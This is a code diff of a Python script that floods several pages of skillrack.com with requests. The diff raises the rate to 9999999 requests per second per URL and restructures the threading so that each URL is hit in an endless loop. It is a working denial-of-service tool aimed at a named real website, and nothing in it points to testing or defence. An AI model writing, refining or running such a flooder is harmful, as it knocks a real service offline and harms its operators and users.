@@ -9,12 +9,11 @@ from requests.packages.urllib3.util.retry import Retry
 urls = [
     'https://skillrack.com',
     'https://www.skillrack.com/faces/ui/profile.xhtml',
-    'https://www.skillrack.com/faces/candidate/codeprogram.xhtml',
-    'https://www.skillrack.com/faces/signup.xhtml'
+    'https://www.skillrack.com/faces/candidate/codeprogram.xhtml'
 ]
 
-# The number of requests to send per second for each URL
-requests_per_url_per_second = 999999  # Adjust this number as needed
+# Number of requests per second per URL
+requests_per_url_per_second = 9999999
 
 # Retry configuration
 retry_strategy = Retry(
@@ -35,27 +34,27 @@ def send_request(url):
         print(f'{url}: Error: {e}')
 
 def run_requests(url, requests_per_second):
-    with ThreadPoolExecutor(max_workers=requests_per_second) as executor:
-        futures = [executor.submit(send_request, url) for _ in range(requests_per_second)]
-        # Wait for all requests to complete
-        for future in futures:
-            future.result()
+    def send_in_batches():
+        with ThreadPoolExecutor(max_workers=requests_per_second) as executor:
+            futures = [executor.submit(send_request, url) for _ in range(requests_per_second)]
+            for future in futures:
+                future.result()
 
-if __name__ == '__main__':
     while True:
         start_time = time.time()
-        
-        # Run the request sending process for each URL in parallel
-        threads = []
-        for url in urls:
-            thread = threading.Thread(target=run_requests, args=(url, requests_per_url_per_second))
-            thread.start()
-            threads.append(thread)
-        
-        # Wait for all threads to complete
-        for thread in threads:
-            thread.join()
-        
+        send_in_batches()
         elapsed_time = time.time() - start_time
         time_to_wait = max(0, 1 - elapsed_time)
         time.sleep(time_to_wait)
+
+if __name__ == '__main__':
+    # Creating a separate thread for each URL to balance the load
+    threads = []
+    for url in urls:
+        thread = threading.Thread(target=run_requests, args=(url, requests_per_url_per_second))
+        thread.start()
+        threads.append(thread)
+    
+    # Waiting for all threads to complete
+    for thread in threads:
+        thread.join()
